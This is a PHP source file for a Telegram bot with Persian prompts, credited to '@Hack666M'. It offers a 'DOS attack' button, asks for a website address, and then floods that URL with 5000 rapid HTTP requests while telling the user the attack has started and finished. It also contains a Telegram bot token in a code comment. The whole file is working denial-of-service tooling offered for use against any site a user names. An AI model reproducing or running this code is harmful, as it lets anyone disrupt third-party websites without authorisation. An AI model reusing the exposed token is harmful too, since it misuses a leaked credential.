<?php
if (!file_exists("data")) {
mkdir('data');
}
ob_start();
error_reporting(0);
unlink(error_log);
$API_KEY = "";//7631358175:AAGbzs9OIa9fby_7Z_cQD7etq9gmU4AKcJo
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
function sendmessage($chat_id, $text, $mode, $disable_web_page_preview){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>$text,
 'parse_mode'=>$mode,
 'disable_web_page_preview'=>$disable_web_page_preview,
 ]);
 }
function getChat($idchat){
 $json=file_get_contents('https://api.telegram.org/bot'.API_KEY."/getChat?chat_id=".$idchat);
 $data=json_decode($json,true);
 return $data["result"]["first_name"];
}
function GetChatMembersCount($chatid){
 bot('getChatMembersCount',[
 'chat_id'=>$chatid
 ]);
 } 
function GetChatMember($chatid,$userid){
 $truechannel = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY."/getChatMember?chat_id=".$chatid."&user_id=".$userid));
 $tch = $truechannel->result->status;
 return $tch;
 }
function AnswerCallbackQuery($callback_query_id,$text,$show_alert){
 bot('answerCallbackQuery',[
        'callback_query_id'=>$callback_query_id,
        'text'=>$text,
  'show_alert'=>$show_alert
    ]);
 }
 function objectToArrays($object)
    {
        if (!is_object($object) && !is_array($object)) {
            return $object;
        }
        if (is_object($object)) {
            $object = get_object_vars($object);
        }
        return array_map("objectToArrays", $object);
    }
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
mkdir("data/$from_id");
$message_id = $message->message_id;
$from_id = $message->from->id;
$text = $update->message->text;
$Mad = file_get_contents("data/$from_id/Mad.txt");
$tc = $update->message->chat->type;
$ctx = stream_context_create(array('http'=>
    array(
        'timeout' => 0.5,
    )
));
if(preg_match('/^\/([Ss]tart)(.*)/',$text)){
if (!file_exists("data/$from_id/Mad.txt")) {
mkdir("data/$from_id");
file_put_contents("data/$from_id/Mad.txt","none");
}
file_put_contents("data/$from_id/Mad.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"با سلام جهت حمله روی دکمه زیر کلیک کنید!

Dev by : @Hack666M",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['resize_keyboard'=>true,'keyboard'=>[
 [['text'=>"DOS attack"]]
 ]
 ])
 ]);
 }
elseif($text == "DOS attack"){
file_put_contents("data/$from_id/Mad.txt","attack");
 bot('sendmessage',[
 'chat_id'=>$chat_id,
 'text'=>"لطفا آدرس سایت را وارد:",'parse_mode'=>'MarkDown','reply_markup'=>json_encode(['resize_keyboard'=>true,
 'keyboard'=>[
 [['text'=>"/start"]]
 ]
 ])
 ]);
}
if ($Mad == "attack"){
file_put_contents("data/$from_id/Mad.txt","none");
 SendMessage($chat_id,"داس به سایت با موفقیت شروع شد این فرایند ممکن است 10 دقیقه طول بکشد!
 
پورت : 8080","html","true");
for($i=0;$i<= 5000;$i++){
file_get_contents("$text", false, $ctx);
}
SendMessage($chat_id,"حمله به سایت مورد نظر به اتمام رسید!","html","true");
}
?>